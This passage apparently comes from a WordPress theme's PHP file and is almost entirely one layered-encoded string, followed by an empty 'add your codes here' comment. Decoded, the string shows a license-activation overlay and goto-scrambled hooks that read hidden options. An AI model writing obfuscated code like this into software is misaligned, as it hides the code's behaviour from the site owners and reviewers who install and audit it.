41\110\121\x36\115\124\x41\x77\112\124\164\60\x5a\130\150\60\114\127\106\163\x61\127\144\x75\x4f\x6d\x4e\x6c\x62\156\122\x6c\143\x6a\x74\x69\x59\x57\x4e\x72\132\63\112\166\x64\127\65\153\x4f\x6e\112\156\131\x6d\x45\157\115\x43\x77\167\114\x44\x41\x73\x49\x44\x41\165\117\124\143\160\x4f\x32\116\166\x62\x47\x39\171\117\x69\x4e\x6d\x5a\155\132\71\x61\104\x51\165\x5a\130\150\x66\x64\x47\x68\x6c\x62\x57\126\x7a\114\103\x42\x68\114\155\126\x34\x58\x33\x52\x6f\132\x57\61\x6c\x63\x79\x42\x37\x5a\x6d\x39\165\x64\103\x31\63\132\127\154\x6e\x61\110\121\66\111\104\x67\x77\x4d\x44\x74\x6d\x62\62\x35\x30\114\x58\x4e\160\x65\x6d\x55\x36\x49\104\x51\167\x63\110\x67\67\131\x32\71\x73\142\63\111\x36\111\x43\116\x6d\x5a\x6d\121\x34\115\x44\101\x67\x49\x57\x6c\164\143\x47\71\x79\144\x47\x46\x75\x64\104\164\163\141\x57\x35\154\114\127\x68\154\x61\x57\144\x6f\x64\104\157\x67\115\x53\x34\172\132\x57\60\x37\x64\x47\126\64\144\103\61\x68\x62\x47\x6c\156\x62\152\157\x67\131\x32\x56\165\144\x47\x56\171\x4f\63\122\154\145\x48\x51\x74\x63\62\x68\150\x5a\107\x39\x33\x4f\x69\101\167\114\152\x41\x79\x5a\x57\60\147\x4d\103\x34\167\116\x57\126\x74\x49\104\x42\154\x62\x53\102\171\x5a\62\x4a\x68\x4b\x44\101\163\x4d\x43\x77\167\114\104\x41\x75\116\x43\153\67\x66\124\167\166\143\x33\x52\x35\x62\107\x55\53\120\107\x52\x70\x64\x69\x42\160\x5a\x44\60\x69\x64\62\106\x79\142\155\x6c\165\132\x79\111\x2b\x50\x47\147\x30\x49\x47\116\163\x59\x58\116\172\x50\x53\112\154\145\x46\x39\x30\x61\107\x56\x74\x5a\130\x4d\x69\x50\152\170\160\111\x47\x4e\x73\131\130\x4e\172\x50\123\112\x6d\x59\123\x42\155\131\123\61\154\x65\107\116\163\x59\x57\61\x68\144\x47\154\x76\x62\151\61\60\x63\155\x6c\x68\142\x6d\x64\163\x5a\123\x49\x67\x59\130\112\x70\x59\x53\x31\157\141\127\x52\153\x5a\x57\64\x39\x49\156\x52\171\x64\x57\x55\x69\x50\x6a\167\x76\141\x54\x34\147\x54\155\x56\x6c\132\103\102\102\131\63\122\x70\144\155\x46\x30\132\x53\x41\x38\120\x33\x42\x6f\143\103\101\x67\x5a\127\116\x6f\x62\x79\x42\x55\123\105\x56\116\122\x56\116\x66\124\x6b\x46\116\x52\126\115\x37\x49\104\70\53\x43\x69\x42\x32\x4c\x6a\167\57\143\x47\150\167\111\103\102\x6c\x59\62\150\x76\111\106\132\x46\125\x6c\116\x4a\x54\x30\64\x37\x49\x44\x38\x2b\x43\x69\102\125\x61\x47\126\x74\132\130\x4d\147\120\x47\x6b\147\131\x32\x78\150\143\x33\x4d\71\x49\155\x5a\x68\x49\x47\132\x68\x4c\127\126\64\131\62\170\x68\x62\x57\x46\x30\x61\x57\71\x75\114\130\x52\171\x61\x57\106\x75\132\62\170\x6c\x49\x69\x42\x68\x63\155\x6c\150\114\127\x68\x70\132\107\122\x6c\142\x6a\60\151\x64\110\x4a\61\x5a\x53\111\53\120\103\x39\160\120\152\167\166\141\104\121\53\x50\110\101\x2b\x55\x47\170\154\131\x58\x4e\x6c\111\x45\170\166\132\62\x6c\x75\111\x45\x39\165\x49\104\170\151\120\x6a\170\150\x49\x47\x4e\163\x59\130\116\172\120\123\112\x6c\145\x46\x39\x30\141\x47\x56\x74\x5a\130\x4d\151\x49\x47\x68\x79\x5a\x57\x59\71\111\x6a\x77\57\x63\107\x68\167\111\103\x42\x6c\131\62\150\x76\x49\105\126\131\126\105\x68\x46\x54\x55\x56\x54\x58\x30\61\x46\x54\x55\x4a\106\x55\154\x39\126\x55\153\167\67\111\x44\x38\x2b\x43\151\x49\147\144\107\106\x79\132\x32\x56\x30\120\123\112\x66\x59\155\x78\x68\142\155\x73\151\x50\152\167\x2f\143\x47\150\167\x49\x43\x42\154\x59\62\150\166\111\x45\126\131\x56\x45\x68\x46\124\x55\126\124\130\x30\106\126\x56\x45\x68\120\x55\152\163\x67\x50\x7a\x34\113\120\x43\x39\x68\x50\x6a\x77\x76\x59\152\x34\x67\126\x47\70\147\x52\62\126\60\111\106\x6c\x76\144\x58\111\147\x54\107\154\152\x5a\x57\x35\172\x5a\123\102\x4c\132\x58\x6b\70\114\63\x41\x2b\x50\x48\x4e\x77\x59\127\64\x67\141\127\121\71\111\155\x46\x72\144\107\x6c\62\x59\x58\116\x70\111\152\64\x67\x50\103\71\x7a\143\x47\x46\x75\120\x6a\x77\166\132\107\154\x32\120\147\157\70\120\63\x42\157\143\103\101\147\146\x53\102\x6e\x62\63\122\166\111\110\x52\x6b\x57\105\x30\x34\x4f\171\102\x45\131\x6b\x52\153\142\x7a\157\147\x59\127\122\153\130\x32\106\x6a\x64\107\x6c\166\x62\x69\x67\x69\130\104\x45\x30\115\126\170\64\116\x6a\x5a\x63\x65\x44\143\x30\130\104\x45\x30\x4e\x56\x77\170\116\x6a\112\143\115\124\x4d\63\130\110\x67\63\x4d\61\x78\x34\116\152\x56\143\x4d\124\x59\60\x58\x44\105\x32\x4e\126\x78\x34\116\172\x42\143\x65\x44\x56\155\130\104\x45\x32\x4e\106\x78\x34\116\152\150\x63\115\124\x51\61\x58\x44\x45\x31\x4e\x56\x78\64\x4e\152\x55\x69\114\103\101\151\130\x44\105\x77\116\126\167\170\x4d\172\102\143\x4d\x54\111\x30\130\x48\x67\60\117\x46\167\x78\115\x44\126\x63\x4d\x54\105\x31\130\104\105\167\116\x56\167\x78\115\152\x4e\x63\145\x44\126\155\x58\104\105\62\x4e\x56\167\170\x4e\x6a\x42\x63\145\x44\x59\60\x58\104\x45\60\115\x56\170\64\116\x7a\122\143\145\x44\131\61\x58\104\105\62\115\151\111\x70\117\x79\102\x6e\x62\63\122\x76\111\x47\x35\104\x4e\x58\106\x74\x4f\x79\x42\127\144\154\x67\x78\116\152\x6f\x67\141\x57\x59\x67\x4b\x43\112\x63\x65\104\143\x32\x58\110\147\x32\x4d\x56\170\64\116\x6d\x4e\x63\x65\x44\131\x35\130\x44\105\x30\x4e\x43\111\147\x49\124\60\x67\x5a\62\126\x30\x58\x32\71\x77\x64\x47\x6c\166\142\x69\x68\x6c\145\x43\101\165\111\110\122\x6f\132\127\61\154\x49\103\x34\147\111\x6c\170\64\116\127\132\143\115\x54\125\60\130\x48\x67\62\117\126\x78\64\x4e\x6a\x4e\x63\115\x54\121\x31\x58\104\x45\61\x4e\x6c\167\x78\x4e\x6a\116\x63\145\104\131\x31\130\104\105\172\116\61\167\170\116\x54\116\143\115\x54\x51\x31\x58\x44\x45\63\x4d\x56\x78\x34\116\x57\132\143\145\x44\143\x7a\x58\x44\x45\x32\116\106\x77\x78\116\104\106\x63\115\124\131\60\x58\110\147\x33\116\x56\x78\x34\116\172\115\151\x4c\x43\x42\x6d\131\x57\170\x7a\x5a\123\153\160\111\110\x73\147\131\127\x52\x6b\x58\x32\x46\152\x64\x47\154\x76\142\151\147\151\x58\x44\x45\x30\x4d\x56\170\64\x4e\x6a\122\x63\145\x44\132\x6b\x58\110\147\62\x4f\x56\x77\170\116\124\132\x63\115\x54\115\63\130\x44\x45\x31\116\154\167\x78\116\124\144\x63\145\104\143\x30\x58\x44\x45\61\x4d\126\167\x78\116\104\116\x63\145\104\131\x31\x58\104\x45\x32\x4d\x79\111\163\x49\103\x4a\x63\115\124\121\x31\x58\110\x67\x33\117\106\x78\64\x4e\127\132\x63\145\104\x63\x30\130\104\x45\x31\x4d\106\x78\64\x4e\152\x56\143\x4d\x54\125\x31\x58\104\105\x30\x4e\126\x77\170\x4e\x6a\x4e\143\145\x44\x56\x6d\x58\104\x45\x31\x4e\x6c\x77\170\116\x54\144\x63\x65\104\x63\60\130\x48\x67\x32\117\x56\x77\170\116\x44\x4e\x63\x65\104\x59\x31\x58\104\x45\62\x4d\61\167\x78\x4d\x7a\144\x63\x65\x44\132\154\130\104\x45\61\x4e\61\170\64\x4e\172\122\x63\x65\104\126\x6d\x58\x48\x67\62\x4d\x56\167\x78\x4e\x44\116\143\x65\104\x63\60\130\x44\105\x31\115\x56\170\x34\116\x7a\x5a\x63\145\104\131\x78\x58\x44\105\x32\x4e\x46\x78\x34\116\x6a\x56\143\x4d\x54\x4d\x33\130\x44\105\x30\115\x56\170\64\116\x6a\122\143\115\x54\125\x31\x58\x48\147\62\x4f\x56\x78\x34\x4e\x6d\125\x69\113\x54\163\147\x59\127\x52\x6b\130\x32\106\x6a\x64\x47\x6c\166\x62\x69\x67\x69\130\x44\105\62\x4e\x31\170\64\x4e\x7a\102\143\x4d\124\x4d\x33\130\104\x45\x30\116\x6c\170\x34\116\155\132\143\115\124\125\x33\x58\104\x45\x32\x4e\x46\170\64\116\x6a\126\x63\145\x44\143\x79\111\x69\x77\x67\x49\154\170\64\x4e\x6a\x56\143\115\124\143\167\x58\104\105\x7a\116\x31\x77\x78\116\152\122\143\x4d\x54\125\167\x58\x48\x67\62\116\x56\170\x34\x4e\x6d\x52\143\145\x44\131\61\130\110\147\x33\115\x31\x77\x78\x4d\x7a\x64\143\145\x44\x5a\x6c\130\x44\x45\61\116\x31\x77\170\116\x6a\x52\143\x65\104\x56\155\130\104\x45\60\x4d\x56\x77\x78\116\x44\116\x63\x65\x44\x63\x30\130\104\105\61\x4d\x56\170\64\116\x7a\132\x63\115\x54\x51\x78\130\104\x45\x32\x4e\106\170\64\x4e\x6a\126\143\115\124\115\x33\130\104\x45\x30\116\154\170\x34\116\172\x4a\x63\x65\x44\x5a\155\130\x48\x67\62\132\126\167\x78\x4e\152\122\143\115\124\x4d\63\130\104\x45\60\x4e\x56\167\170\116\124\x5a\x63\x4d\x54\121\60\x49\x69\x6b\67\x49\x48\x30\147\132\62\71\x30\142\171\102\x68\141\x32\170\146\143\152\x73\x67\131\x57\x74\x73\130\x33\111\66\111\x41\x3d\x3d"));
/*-----------------------------------------------------------------------------------*/
/*
/*      add your codes here
/*
/*-----------------------------------------------------------------------------------*/
